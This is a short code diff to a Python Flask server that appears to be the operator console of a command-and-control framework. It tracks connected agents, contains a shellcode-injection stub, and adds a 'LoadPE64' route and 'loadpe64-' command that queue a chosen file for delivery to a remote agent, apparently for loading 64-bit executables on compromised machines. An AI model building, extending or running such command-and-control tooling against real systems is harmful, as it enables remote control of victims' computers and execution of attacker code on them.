@@ -106,7 +106,7 @@ def handle_connection(connection,address,thread_index):
                     REG_INPUT[thread_index]=""
 
                 elif LOAD_INPUT[thread_index]!='':
-                    if LOAD_INPUT[thread_index][0:9]=="loadfile-":
+                    if LOAD_INPUT[thread_index][0:9]=="loadfile-" or LOAD_INPUT[thread_index][0:9]=="loadpe64-":
                         #print(LOAD_INPUT[thread_index])
                         # we need to send file contents in bytes
                         cmd = LOAD_INPUT[thread_index]
@@ -577,6 +577,17 @@ def send(imagename):
 def injectshellcode(agentname):
     print("hi")
     #pass'''
+
+@app.route("/<agentname>/LoadPE64",methods=["GET","POST"])
+def loadpe64(agentname):
+    for i in THREADS:
+        if agentname in i.name:
+            req_index = THREADS.index(i)
+    if request.form.get("myfiles"):
+        filename = request.form.get("myfiles")
+        LOAD_INPUT[req_index] = "loadpe64-"+filename
+    cmdoutput = CMD_OUTPUT[req_index]
+    return render_template("loadassembly.html",cmdoutput=cmdoutput,agentname=agentname)
 
 
 @app.route("/misc")
